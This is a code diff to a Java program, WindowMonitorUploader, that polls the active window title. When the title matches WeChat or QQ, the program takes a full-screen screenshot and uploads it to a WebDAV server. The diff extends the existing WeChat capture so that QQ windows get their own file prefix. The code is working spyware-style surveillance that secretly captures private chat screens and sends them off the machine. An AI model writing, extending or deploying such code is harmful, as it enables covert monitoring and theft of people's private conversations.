@@ -64,8 +64,10 @@ public class WindowMonitorUploader {
         while (true) {
             try {
                 String title = getActiveWindowTitle();
-                if (title.contains(MATCH_KEYWORD_1) || title.contains(MATCH_KEYWORD_2)) {
-                    uploadWechatImage(sardine);
+                if (title.contains(MATCH_KEYWORD_1)) {
+                    uploadImage(sardine, "wechat");
+                } else if (title.contains(MATCH_KEYWORD_2)) {
+                    uploadImage(sardine, "qq");
                 }
                 Thread.sleep(interval);
             } catch (Exception e) {
@@ -74,11 +76,11 @@ public class WindowMonitorUploader {
         }
     }
 
-    private static void uploadWechatImage(Sardine sardine) throws Exception {
+    private static void uploadImage(Sardine sardine, String prefix) throws Exception {
         BufferedImage screenshot = takeFullScreenshot();
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
         String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
-        String fileName = "wechat_" + timestamp + ".png";
+        String fileName = prefix + "_" + timestamp + ".png";
         // 将截图写入 ByteArrayOutputStream
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ImageIO.write(screenshot, "png", baos);
